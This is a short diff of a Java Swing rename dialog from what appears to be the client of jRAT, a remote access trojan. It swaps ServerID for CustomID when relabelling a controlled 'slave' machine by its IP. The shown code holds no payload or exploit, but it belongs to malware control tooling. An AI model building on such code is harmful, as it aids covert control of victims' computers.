@@ -15,7 +15,7 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.border.EmptyBorder;
 
 import se.jrat.client.AbstractSlave;
-import se.jrat.client.settings.ServerID;
+import se.jrat.client.settings.CustomID;
 import se.jrat.client.utils.Utils;
 
 
@@ -43,7 +43,7 @@ public class FrameRename extends BaseFrame {
 
 		JLabel lblOldId = new JLabel("Old ID:");
 
-		txtOldID = new JTextField(slave.getServerID());
+		txtOldID = new JTextField(slave.getID());
 		txtOldID.setEditable(false);
 		txtOldID.setColumns(10);
 
@@ -55,7 +55,7 @@ public class FrameRename extends BaseFrame {
 		btnRename = new JButton("Rename");
 		btnRename.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				ServerID.getGlobal().add(txtNewID.getText(), sl.getServerID(), sl.getRawIP());
+				CustomID.getGlobal().add(txtNewID.getText(), sl.getID(), sl.getRawIP());
 				for (int i = 0; i < Frame.mainModel.getRowCount(); i++) {
 					AbstractSlave sla = Utils.getSlave(Frame.mainModel.getValueAt(i, 3).toString());
 					if (sla != null && sla.equals(sl)) {
